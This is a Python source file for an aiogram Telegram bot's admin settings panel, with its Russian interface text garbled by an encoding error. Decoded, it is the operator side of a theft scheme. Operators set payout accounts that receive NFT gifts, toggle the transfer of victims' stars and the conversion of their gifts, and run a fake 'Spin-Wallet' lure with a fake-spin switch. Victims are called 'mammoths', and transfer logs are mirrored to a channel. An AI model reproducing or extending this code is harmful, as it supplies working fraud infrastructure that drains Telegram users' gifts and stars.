from aiogram import Router, types, F
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from sqlalchemy import func, select, update
from db import Session
from models import Admin, Settings, WorkerBot, WorkerBotUser
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from sqlalchemy.orm import selectinload
from sqlalchemy import or_

router = Router()

class AddIDState(StatesGroup):
    waiting_for_id = State()

class AddIDState(StatesGroup):
    waiting_for_id = State()

class ResetUserSpinState(StatesGroup):
    waiting_for_user_id = State()

# –ù–æ–≤—ã–π State –¥–ª—è –ª–æ–≥-–∫–∞–Ω–∞–ª–∞
class LogChannelState(StatesGroup):
    waiting_for_channel_id = State()

@router.message(F.text == "‚öôÔ∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∏")
async def settings_handler(message: types.Message):
    if message.chat.type != "private":
        await message.answer("‚õî –î–æ—Å—Ç—É–ø–Ω–æ —Ç–æ–ª—å–∫–æ –≤ –ª–∏—á–∫–µ —Å –±–æ—Ç–æ–º.")
        return

    await send_transfer_status(message)

async def get_admin_and_settings(tg_id: int):
    async with Session() as session:
        stmt_admin = select(Admin).where(Admin.telegram_id == tg_id)
        admin = (await session.execute(stmt_admin)).scalar_one_or_none()
        if not admin:
            return None, None

        stmt_settings = select(Settings).where(Settings.admin_id == admin.id)
        settings = (await session.execute(stmt_settings)).scalar_one_or_none()

        if not settings:
            settings = Settings(admin_id=admin.id, payout_ids="")
            session.add(settings)
            await session.commit()

        return admin, settings

async def send_transfer_status(message_or_callback):
    if isinstance(message_or_callback, types.Message):
        tg_id = message_or_callback.from_user.id
    else:
        tg_id = message_or_callback.from_user.id

    _, settings = await get_admin_and_settings(tg_id)
    payout_connected = "‚úÖ <b>–ü–µ—Ä–µ–¥–∞—á–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∞.</b>" if settings and settings.payout_ids else "‚ùå <b>–ü–µ—Ä–µ–¥–∞—á–∞ –Ω–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∞.</b>"

    text = (
        "‚öôÔ∏è <b>–ù–∞—Å—Ç—Ä–æ–π–∫–∏</b>\n\n"
        "üöÄ <b>–ü–µ—Ä–µ–¥–∞—á–∞ NFT</b> ‚Äî –Ω—É–∂–Ω–æ —á—Ç–æ–±—ã –ø–µ—Ä–µ–¥–∞–≤–∞—Ç—å NFT –Ω–∞ –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç.\n"
        "‚ö°Ô∏è –ó–∞–ø—É—Å—Ç–∏ –≤—Å–µ—Ö —Å–≤–æ–∏—Ö –±–æ—Ç–æ–≤ –Ω–∞ –∞–∫–∫–∞—É–Ω—Ç–µ –¥–ª—è —É—Å–ø–µ—à–Ω–æ–π –ø–µ—Ä–µ–¥–∞—á–∏.\n\n"
        f"{payout_connected}\n\n"
        "üõ† <b>–ß—Ç–æ –º–æ–∂–Ω–æ –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å:</b>\n"
        "‚Ä¢ –°–ø–∏—Å–æ–∫ –∞–∫–∫–∞—É–Ω—Ç–æ–≤ –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏\n"
        "‚Ä¢ –û–ø—Ü–∏–∏ –ø–µ—Ä–µ–¥–∞—á–∏\n"
        "‚Ä¢ –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —à–∞–±–ª–æ–Ω–∞–º–∏\n"
        "‚Ä¢ –í–∫–ª—é—á–∏—Ç—å –ª–æ–≥-–∫–∞–Ω–∞–ª\n"
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="–ü–µ—Ä–µ–¥–∞—á–∞", callback_data="add_payout_id"),
            InlineKeyboardButton(text="–ê–∫–∫–∞—É–Ω—Ç—ã", callback_data="manage_workers")
        ],
        [
            InlineKeyboardButton(text="–û–ø—Ü–∏–∏", callback_data="open_transfer_menu"),
            InlineKeyboardButton(text="–®–∞–±–ª–æ–Ω—ã", callback_data="manage_templates")
        ],
        [
            InlineKeyboardButton(text="–õ–æ–≥-–∫–∞–Ω–∞–ª", callback_data="log_channel")
        ]
    ])

    if isinstance(message_or_callback, types.Message):
        await message_or_callback.answer(text, reply_markup=keyboard, parse_mode="HTML")
    else:
        await message_or_callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
        await message_or_callback.answer()

@router.callback_query(F.data == "add_payout_id")
async def add_payout_id_start(callback: types.CallbackQuery, state: FSMContext):
    text = (
        "<b>üì• –ü—Ä–∏—à–ª–∏—Ç–µ Telegram ID</b> –∞–∫–∫–∞—É–Ω—Ç–∞, –∫–æ—Ç–æ—Ä–æ–º—É –≤—ã —Ö–æ—Ç–∏—Ç–µ –ø–µ—Ä–µ–¥–∞–≤–∞—Ç—å –ø–æ–¥–∞—Ä–∫–∏.\n\n"
        "üîé –£–∑–Ω–∞—Ç—å –µ–≥–æ –º–æ–∂–Ω–æ –≤ –±–æ—Ç–µ: <b>@getmyid_bot</b>\n"
        "üëÜ –ü—Ä–æ—Å—Ç–æ –æ—Ç–∫—Ä–æ–π—Ç–µ –±–æ—Ç, –Ω–∞–∂–º–∏—Ç–µ <b>Start</b> –∏ —Å–∫–æ–ø–∏—Ä—É–π—Ç–µ ID.\n\n"
        "‚ö†Ô∏è <b>–ù–µ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Å–≤–æ–π –æ—Å–Ω–æ–≤–Ω–æ–π –∞–∫–∫–∞—É–Ω—Ç.</b>\n"
        "–†–µ–∫–æ–º–µ–Ω–¥—É–µ–º —Å–æ–∑–¥–∞—Ç—å –æ—Ç–¥–µ–ª—å–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø–æ–¥–∞—Ä–∫–æ–≤."
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="–ù–∞–∑–∞–¥", callback_data="back_to_settings")]
    ])

    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
    await state.set_state(AddIDState.waiting_for_id)
    await callback.answer()

@router.message(AddIDState.waiting_for_id)
async def save_payout_id(message: types.Message, state: FSMContext):
    new_id = message.text.strip()

    if not new_id.isdigit():
        await message.answer("‚ùå ID –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —á–∏—Å–ª–æ–º. –ü–æ–ø—Ä–æ–±—É–π –µ—â—ë —Ä–∞–∑.")
        return

    admin, settings = await get_admin_and_settings(message.from_user.id)
    if not admin:
        await message.answer("‚ùå –ü—Ä–æ—Ñ–∏–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω.")
        await state.clear()
        return

    ids = [i.strip() for i in (settings.payout_ids or "").split(",") if i.strip()]
    if new_id not in ids:
        ids.append(new_id)
    settings.payout_ids = ",".join(ids)

    admin.worker_added_payout_id_flag = True

    async with Session() as session:
        session.add_all([settings, admin])
        await session.commit()

    await state.clear()
    await message.answer("‚úÖ <b>–°–æ—Ö—Ä–∞–Ω–µ–Ω–æ</b>", parse_mode="HTML")
    await send_transfer_status(message)

@router.callback_query(F.data == "manage_workers")
async def manage_workers(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()  

    _, settings = await get_admin_and_settings(callback.from_user.id)
    ids = [i.strip() for i in settings.payout_ids.split(",") if i.strip()] if settings and settings.payout_ids else []

    text = (
        "üë• <b>–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–µ—Ä–µ–¥–∞—á–∞–º–∏</b>\n\n"
        "–í—ã–±–µ—Ä–∏—Ç–µ –ø–µ—Ä–µ–¥–∞—á—É (Telegram ID), –∫–æ—Ç–æ—Ä—É—é —Ö–æ—Ç–∏—Ç–µ —É–¥–∞–ª–∏—Ç—å –∏–∑ —Å–ø–∏—Å–∫–∞. "
        "–£–¥–∞–ª—ë–Ω–Ω—ã–µ ID –±–æ–ª—å—à–µ <b>–Ω–µ –±—É–¥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏</b>.\n\n"
        "<b>–°–ø–∏—Å–æ–∫ –ø–æ–¥–∫–ª—é—á—ë–Ω–Ω—ã—Ö ID:</b>"
    )

    keyboard_buttons = [[InlineKeyboardButton(text=f"{pid}", callback_data=f"confirm_delete_{pid}")] for pid in ids]
    keyboard_buttons.append([InlineKeyboardButton(text="–ù–∞–∑–∞–¥", callback_data="back_to_settings")])

    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)

    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
    await callback.answer()

@router.callback_query(F.data.startswith("confirm_delete_"))
async def confirm_delete_id(callback: types.CallbackQuery):
    pid = callback.data.split("_")[-1]
    text = f"‚ùóÔ∏è–£–¥–∞–ª–∏—Ç—å ID <code>{pid}</code> –∏–∑ —Å–ø–∏—Å–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏?"

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="–î–∞", callback_data=f"delete_id_{pid}")],
        [InlineKeyboardButton(text="–ù–µ—Ç", callback_data="manage_workers")]
    ])

    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
    await callback.answer()

@router.callback_query(F.data.startswith("delete_id_"))
async def delete_id(callback: types.CallbackQuery, state: FSMContext):
    pid = callback.data.split("_")[-1]
    admin, settings = await get_admin_and_settings(callback.from_user.id)

    async with Session() as session:
        query = select(WorkerBot).where(
            WorkerBot.owner_id == admin.id,
            WorkerBot.nft_transfer_to_id == int(pid)
        )
        result = await session.execute(query)
        used_bot = result.scalar_one_or_none()

        if used_bot:
            await callback.answer(
                f"‚ùå ID {pid} –ø—Ä–∏–≤—è–∑–∞–Ω –∫ –±–æ—Ç—É @{used_bot.username} –∏ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å —É–¥–∞–ª—ë–Ω.",
                show_alert=True
            )
            return

        if settings and settings.payout_ids:
            ids = [i.strip() for i in settings.payout_ids.split(",") if i.strip()]
            if pid in ids:
                ids.remove(pid)
                settings.payout_ids = ",".join(ids)
                admin.worker_added_payout_id_flag = bool(ids)

                session.add_all([settings, admin])
                await session.commit()

    await callback.answer(text=f"‚úÖ ID {pid} —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª—ë–Ω.", show_alert=True)
    await manage_workers(callback, state)

@router.callback_query(F.data == "back_to_settings")
async def back_to_settings(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()  
    await send_transfer_status(callback)

@router.callback_query(F.data == "open_transfer_menu")
async def open_transfer_menu(callback: types.CallbackQuery):
    _, settings = await get_admin_and_settings(callback.from_user.id)

    transfer_stars = getattr(settings, "transfer_stars_enabled", True)
    convert_gifts = getattr(settings, "convert_gifts_to_stars_enabled", True)

    transfer_stars_text = "‚úÖ –ü–µ—Ä–µ–≤–æ–¥–∏—Ç—å –∑–≤–µ–∑–¥—ã" if transfer_stars else "‚ùå –ü–µ—Ä–µ–≤–æ–¥–∏—Ç—å –∑–≤–µ–∑–¥—ã"
    convert_gifts_text = "‚úÖ –û–±–º–µ–Ω–∏–≤–∞—Ç—å –ø–æ–¥–∞—Ä–∫–∏" if convert_gifts else "‚ùå –û–±–º–µ–Ω–∏–≤–∞—Ç—å –ø–æ–¥–∞—Ä–∫–∏"

    text = (
        "<b>‚öôÔ∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏</b>\n\n"
        f"{transfer_stars_text}\n"
        f"{convert_gifts_text}"
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=transfer_stars_text, callback_data="toggle_transfer_stars")],
        [InlineKeyboardButton(text=convert_gifts_text, callback_data="toggle_convert_gifts")],
        [InlineKeyboardButton(text="–ù–∞–∑–∞–¥", callback_data="back_to_settings")]
    ])

    try:
        await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
    except:
        await callback.message.answer(text, reply_markup=keyboard, parse_mode="HTML")

    await callback.answer()


@router.callback_query(F.data == "toggle_transfer_stars")
async def toggle_transfer_stars(callback: types.CallbackQuery):
    admin, settings = await get_admin_and_settings(callback.from_user.id)
    settings.transfer_stars_enabled = not getattr(settings, "transfer_stars_enabled", True)

    async with Session() as session:
        session.add(settings)
        await session.commit()

    try:
        await callback.message.delete()
    except:
        pass

    await open_transfer_menu(callback)


@router.callback_query(F.data == "toggle_convert_gifts")
async def toggle_convert_gifts(callback: types.CallbackQuery):
    admin, settings = await get_admin_and_settings(callback.from_user.id)
    settings.convert_gifts_to_stars_enabled = not getattr(settings, "convert_gifts_to_stars_enabled", True)

    async with Session() as session:
        session.add(settings)
        await session.commit()

    try:
        await callback.message.delete()
    except:
        pass

    await open_transfer_menu(callback)


def get_manage_templates_keyboard_and_text(fake_spin_enabled: bool, spin_count: int):
    fake_spin_text = (
        "‚òëÔ∏è –§–µ–π–∫-–≤—Ä–∞—â–µ–Ω–∏–µ –í–ö–õ" if fake_spin_enabled else "üî≤ –§–µ–π–∫-–≤—Ä–∞—â–µ–Ω–∏–µ –í–´–ö–õ"
    )
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="–°–±—Ä–æ—Å–∏—Ç—å –≤—Ä–∞—â–µ–Ω–∏–µ –≤—Å–µ–º", callback_data="reset_all_spins")],
        [InlineKeyboardButton(text="–°–±—Ä–æ—Å–∏—Ç—å –≤—Ä–∞—â–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é", callback_data="reset_user_spin")],
        [InlineKeyboardButton(text=fake_spin_text, callback_data="toggle_fake_spin")],
        [InlineKeyboardButton(text="–ù–∞–∑–∞–¥", callback_data="back_to_settings")],
    ])
    text = (
        "<b>üìç –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —à–∞–±–ª–æ–Ω–æ–º Spin-Wallet</b>\n\n"
        "‚òëÔ∏è –ó–¥–µ—Å—å –º–æ–∂–Ω–æ —Å–±—Ä–æ—Å–∏—Ç—å –≤—Å–µ–º –∏–ª–∏ –æ–ø—Ä–µ–¥–µ–ª—ë–Ω–Ω–æ–º—É –º–∞–º–æ–Ω—Ç–∞–º –≤—Ä–∞—â–µ–Ω–∏–µ.\n"
        f"üîÅ –§–µ–π–∫-–≤—Ä–∞—â–µ–Ω–∏–µ: <b>{'–í–∫–ª—é—á–µ–Ω–æ' if fake_spin_enabled else '–í—ã–∫–ª—é—á–µ–Ω–æ'}</b>\n"
        f"üé∞ –£—Å–ø–µ—à–Ω–æ —Å–¥–µ–ª–∞–ª–∏ –≤—Ä–∞—â–µ–Ω–∏–µ: <b>{spin_count}</b>"
    )
    return keyboard, text

async def get_admin_settings_and_stats(tg_id):
    async with Session() as session:
        admin_stmt = (
            select(Admin.id)
            .where(Admin.telegram_id == tg_id)
        )
        admin_id = (await session.execute(admin_stmt)).scalar_one_or_none()
        if not admin_id:
            return None, None, 0, 0

        settings_stmt = select(Settings.fake_spin_enabled).where(Settings.admin_id == admin_id)
        bots_stmt = select(WorkerBot.id).where(WorkerBot.owner_id == admin_id)
        fake_spin_enabled = (await session.execute(settings_stmt)).scalar_one_or_none() or False
        bot_ids = [row[0] for row in (await session.execute(bots_stmt)).all()]
        spin_count = 0
        if bot_ids:
            spin_count = (await session.execute(
                select(func.count()).select_from(WorkerBotUser).where(
                    WorkerBotUser.worker_bot_id.in_(bot_ids),
                    WorkerBotUser.spin_used.is_(True)
                )
            )).scalar_one()
        return admin_id, fake_spin_enabled, spin_count, bot_ids

@router.callback_query(F.data == "manage_templates")
async def manage_templates_handler(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    admin_id, fake_spin_enabled, spin_count, _ = await get_admin_settings_and_stats(callback.from_user.id)
    keyboard, text = get_manage_templates_keyboard_and_text(fake_spin_enabled, spin_count)
    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
    await callback.answer()

@router.callback_query(F.data == "toggle_fake_spin")
async def toggle_fake_spin_handler(callback: types.CallbackQuery):
    async with Session() as session:
        admin_stmt = select(Admin.id).where(Admin.telegram_id == callback.from_user.id)
        admin_id = (await session.execute(admin_stmt)).scalar_one_or_none()
        if not admin_id:
            await callback.answer("–û—à–∏–±–∫–∞: –≤—ã –Ω–µ –∞–¥–º–∏–Ω.", show_alert=True)
            return

        settings_stmt = select(Settings).where(Settings.admin_id == admin_id)
        settings = (await session.execute(settings_stmt)).scalar_one_or_none()
        if not settings:
            await callback.answer("–ù–µ—Ç –Ω–∞—Å—Ç—Ä–æ–µ–∫.", show_alert=True)
            return

        settings.fake_spin_enabled = not bool(getattr(settings, "fake_spin_enabled", False))
        await session.commit()
        fake_spin_enabled = settings.fake_spin_enabled

        bots_stmt = select(WorkerBot.id).where(WorkerBot.owner_id == admin_id)
        bot_ids = [row[0] for row in (await session.execute(bots_stmt)).all()]
        spin_count = 0
        if bot_ids:
            spin_count = (await session.execute(
                select(func.count()).select_from(WorkerBotUser).where(
                    WorkerBotUser.worker_bot_id.in_(bot_ids),
                    WorkerBotUser.spin_used.is_(True)
                )
            )).scalar_one()

    keyboard, text = get_manage_templates_keyboard_and_text(fake_spin_enabled, spin_count)
    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
    await callback.answer(f"–§–µ–π–∫-–≤—Ä–∞—â–µ–Ω–∏–µ {'–í–ö–õ' if fake_spin_enabled else '–í–´–ö–õ'}")

@router.callback_query(lambda c: c.data == "reset_user_spin")
async def reset_user_spin_start(callback: types.CallbackQuery, state: FSMContext):
    text = (
        "–ü—Ä–∏—à–ª–∏ <b>ID</b> –∏–ª–∏ <b>username</b> –º–∞–º–æ–Ω—Ç–∞, –∫–æ—Ç–æ—Ä–æ–º—É –Ω—É–∂–Ω–æ —Å–±—Ä–æ—Å–∏—Ç—å –≤—Ä–∞—â–µ–Ω–∏–µ.\n\n"
        "–ú–æ–∂–Ω–æ –ø–∏—Å–∞—Ç—å –∫–∞–∫ <b>@username</b>, —Ç–∞–∫ –∏ –ø—Ä–æ—Å—Ç–æ username. ID ‚Äî —Ç–æ–ª—å–∫–æ —á–∏—Å–ª–æ."
    )
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="–ù–∞–∑–∞–¥", callback_data="manage_templates")]
    ])
    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
    await state.set_state(ResetUserSpinState.waiting_for_user_id)
    await callback.answer()

@router.message(ResetUserSpinState.waiting_for_user_id)
async def reset_user_spin_process(message: types.Message, state: FSMContext):
    user_input = message.text.strip().replace("@", "")
    admin_id, fake_spin_enabled, spin_count, bot_ids = await get_admin_settings_and_stats(message.from_user.id)
    if not admin_id:
        await message.answer("–û—à–∏–±–∫–∞: –≤—ã –Ω–µ –∞–¥–º–∏–Ω.")
        await state.clear()
        return
    if not bot_ids:
        await message.answer("–£ –≤–∞—Å –Ω–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã—Ö –±–æ—Ç–æ–≤.")
        await state.clear()
        return

    async with Session() as session:
        where_clauses = [WorkerBotUser.worker_bot_id.in_(bot_ids)]
        if user_input.isdigit():
            where_clauses.append(WorkerBotUser.telegram_id == int(user_input))
        else:
            where_clauses.append(or_(
                WorkerBotUser.username == user_input,
                WorkerBotUser.username == f"@{user_input}"
            ))

        stmt = select(WorkerBotUser.id).where(*where_clauses)
        user_id = (await session.execute(stmt)).scalar_one_or_none()
        if not user_id:
            await message.answer("‚ùå –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω –∏–ª–∏ –Ω–µ –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∏—Ç –≤–∞—à–∏–º –±–æ—Ç–∞–º.")
            await state.clear()
            return

        upd_stmt = (
            update(WorkerBotUser)
            .where(WorkerBotUser.id == user_id)
            .values(spin_used=False)
        )
        await session.execute(upd_stmt)
        await session.commit()

    await message.answer("‚úÖ –í—Ä–∞—â–µ–Ω–∏–µ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Å–±—Ä–æ—à–µ–Ω–æ.")
    await state.clear()
    keyboard, text = get_manage_templates_keyboard_and_text(fake_spin_enabled, spin_count)
    await message.answer(text, reply_markup=keyboard, parse_mode="HTML")

@router.callback_query(lambda c: c.data == "reset_all_spins")
async def reset_all_spins_handler(callback: types.CallbackQuery):
    admin_id, fake_spin_enabled, spin_count, bot_ids = await get_admin_settings_and_stats(callback.from_user.id)
    if not admin_id:
        await callback.answer("–û—à–∏–±–∫–∞: –≤—ã –Ω–µ –∞–¥–º–∏–Ω.", show_alert=True)
        return
    if not bot_ids:
        await callback.answer("–£ –≤–∞—Å –Ω–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã—Ö –±–æ—Ç–æ–≤.", show_alert=True)
        return

    async with Session() as session:
        upd_stmt = (
            update(WorkerBotUser)
            .where(WorkerBotUser.worker_bot_id.in_(bot_ids), WorkerBotUser.spin_used.is_(True))
            .values(spin_used=False)
        )
        result = await session.execute(upd_stmt)
        await session.commit()
        count = result.rowcount or 0

    await callback.answer(f"‚úÖ –°–±—Ä–æ—à–µ–Ω–æ –≤—Ä–∞—â–µ–Ω–∏–µ –¥–ª—è {count} –º–∞–º–æ–Ω—Ç–æ–≤.", show_alert=True)

@router.callback_query(F.data == "log_channel")
async def log_channel_handler(callback: types.CallbackQuery, state: FSMContext):
    admin, _ = await get_admin_and_settings(callback.from_user.id)
    current_channel_id = admin.log_channel_id if admin else None

    text = (
        "<b>‚öôÔ∏è –ù–ê–°–¢–†–û–ô–ö–ê –õ–û–ì-–ö–ê–ù–ê–õ–ê</b>\n\n"
        "<b>1.</b> <b>–î–æ–±–∞–≤—å —ç—Ç–æ–≥–æ –±–æ—Ç–∞ <code>@AlphaSsquadBot</code> –∞–¥–º–∏–Ω–æ–º –≤ —Å–≤–æ–π –∫–∞–Ω–∞–ª.</b>\n"
        "<b>2.</b> <b>–û—Ç–ø—Ä–∞–≤—å —Å—é–¥–∞ ID –∫–∞–Ω–∞–ª–∞ (–ø—Ä–∏–º–µ—Ä: <code>-1001234567890</code>)</b>\n\n"
        "<b>‚ùì –ö–∞–∫ –ø–æ–ª—É—á–∏—Ç—å ID –∫–∞–Ω–∞–ª–∞:</b>\n"
        "<b>‚û§ –ü–µ—Ä–µ—à–ª–∏ –ª—é–±–æ–π –ø–æ—Å—Ç –∏–∑ –∫–∞–Ω–∞–ª–∞ –±–æ—Ç—É</b> <b>@getmyid_bot</b> <b>–∏ —Å–∫–æ–ø–∏—Ä—É–π ID.</b>\n"
        "<b>üì§ –ü–æ—Å–ª–µ —ç—Ç–æ–≥–æ —è –Ω–∞—á–Ω—É –¥—É–±–ª–∏—Ä–æ–≤–∞—Ç—å —Ç—É–¥–∞ –ª–æ–≥–∏ –ø–µ—Ä–µ–¥–∞—á–∏.</b>\n\n"
        "<b>‚ùå –ß—Ç–æ–±—ã –æ—Ç–∫–ª—é—á–∏—Ç—å –ª–æ–≥-–∫–∞–Ω–∞–ª ‚Äî –Ω–∞–∂–º–∏ –Ω–∞ –∫–Ω–æ–ø–∫—É —Å –µ–≥–æ ID –Ω–∏–∂–µ.</b>"
    )
    keyboard_buttons = []
    if current_channel_id:
        keyboard_buttons.append(
            [InlineKeyboardButton(text=f"{current_channel_id}", callback_data="remove_log_channel")]
        )
    keyboard_buttons.append(
        [InlineKeyboardButton(text="–ù–∞–∑–∞–¥", callback_data="back_to_settings")]
    )
    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)
    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
    await state.set_state(LogChannelState.waiting_for_channel_id)  
    await callback.answer()

@router.message(LogChannelState.waiting_for_channel_id)
async def save_log_channel_id(message: types.Message, state: FSMContext):
    admin, _ = await get_admin_and_settings(message.from_user.id)
    if not admin:
        await message.answer("‚ùå –ê–¥–º–∏–Ω –Ω–µ –Ω–∞–π–¥–µ–Ω.")
        await state.clear()
        return

    channel_id = message.text.strip()
    if not channel_id.startswith('-100') or not channel_id[1:].isdigit():
        await message.answer("‚ùå –ù–µ –ø–æ—Ö–æ–∂–µ –Ω–∞ Telegram ID –∫–∞–Ω–∞–ª–∞. –ü—Ä–∏–º–µ—Ä: <code>-1001234567890</code>", parse_mode="HTML")
        return

    admin.log_channel_id = int(channel_id)
    async with Session() as session:
        session.add(admin)
        await session.commit()

    await state.clear()
    await message.answer("‚úÖ –õ–æ–≥-–∫–∞–Ω–∞–ª —Å–æ—Ö—Ä–∞–Ω—ë–Ω (–æ–±–Ω–æ–≤–ª—ë–Ω).", parse_mode="HTML")
    await send_transfer_status(message)

# –û—Ç–∫–ª—é—á–∏—Ç—å –ª–æ–≥-–∫–∞–Ω–∞–ª (—É–¥–∞–ª–µ–Ω–∏–µ)
@router.callback_query(F.data == "remove_log_channel")
async def remove_log_channel_handler(callback: types.CallbackQuery, state: FSMContext):
    admin, _ = await get_admin_and_settings(callback.from_user.id)
    if not admin or not admin.log_channel_id:
        await callback.answer("–õ–æ–≥-–∫–∞–Ω–∞–ª –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.", show_alert=True)
        return

    admin.log_channel_id = None
    async with Session() as session:
        session.add(admin)
        await session.commit()

    await callback.answer("‚ùå –õ–æ–≥-–∫–∞–Ω–∞–ª –æ—Ç–∫–ª—é—á—ë–Ω.", show_alert=True)
    await send_transfer_status(callback)